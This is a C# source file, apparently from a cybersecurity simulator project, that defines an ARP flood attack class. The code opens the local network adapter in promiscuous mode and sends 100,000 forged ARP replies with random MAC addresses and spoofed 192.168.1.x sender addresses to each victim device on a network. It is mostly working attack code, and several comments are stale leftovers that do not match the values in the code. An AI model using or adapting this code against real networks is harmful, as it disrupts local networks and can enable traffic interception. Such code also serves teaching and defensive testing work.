﻿using System;
using System.Text;
using System.Collections.Generic;
using PcapDotNet.Base;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using PDA_Cyber_Security_Simulator_Domain;

namespace PDA_Cyber_Security_Simulator_V1
{
    class ArpFloodAttack : IAttack
    {
        public Network Victim { get; set; }

        public void AttackDevice(string victimIpAddress, string victimMacAddress)
        {
            Random rand = new Random((int)DateTime.Now.Ticks);

            // Retrieve the device list from the local machine
            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;

            if (allDevices.Count == 0)
            {
                Console.WriteLine("No interfaces found! Make sure WinPcap is installed.");
                return;
            }

            // Take the selected adapter
            PacketDevice selectedDevice = allDevices[0];

            using (PacketCommunicator communicator = selectedDevice.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000))
            {
                for (int i = 0; i != 100000; ++i)
                {
                    // Supposing to be on ethernet, set mac source to 01:01:01:01:01:01
                    string randMac = "4C:0C:BD:" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString() + ":" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString() + ":" + rand.Next(2, 9).ToString() + rand.Next(2, 9).ToString();
                    

                    EthernetLayer ethernetLayer =
                        new EthernetLayer
                        {
                            Source = new MacAddress(randMac),
                            Destination = new MacAddress(victimMacAddress.Replace('-', ':')),
                            EtherType = EthernetType.None, // Will be filled automatically.
                        };


                    ArpLayer arpLayer =
                        new ArpLayer
                        {
                            ProtocolType = EthernetType.IpV4,
                            Operation = ArpOperation.Reply,
                            SenderHardwareAddress = new byte[] { 15, 16, 16, 3, (byte)rand.Next(1, 14), (byte)rand.Next(1, 14) }.AsReadOnly(), // 03:03:03:03:03:03.
                            SenderProtocolAddress = new byte[] { 192, 168, 1, (byte)rand.Next(5, 180) }.AsReadOnly(), // 1.2.3.4.
                            //TargetHardwareAddress = new byte[] { 4, 4, 4, 4, 4, 4 }.AsReadOnly(), // 04:04:04:04:04:04.
                            TargetHardwareAddress = new byte[] { Convert.ToByte(victimMacAddress.Substring(0, 2), 16), Convert.ToByte(victimMacAddress.Substring(3, 2), 16), Convert.ToByte(victimMacAddress.Substring(6, 2), 16), Convert.ToByte(victimMacAddress.Substring(9, 2), 16), Convert.ToByte(victimMacAddress.Substring(12, 2), 16), Convert.ToByte(victimMacAddress.Substring(15, 2), 16) }.AsReadOnly(),
                            TargetProtocolAddress = new byte[] { 192, 168, 1, 1 }.AsReadOnly(), // 11.22.33.44.
                        };

                    PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);

                    communicator.SendPacket(builder.Build(DateTime.Now));
                }
            }
        }

        public void AttackNetwork()
        {
            if (this.Victim != null)
            {
                for (int i = 0; i < Victim.Devices.Count; i++)
                {
                    this.AttackDevice(Victim.Devices[i].IpAddress, Victim.Devices[i].MacAddress);
                }
            }
        }
    }
}
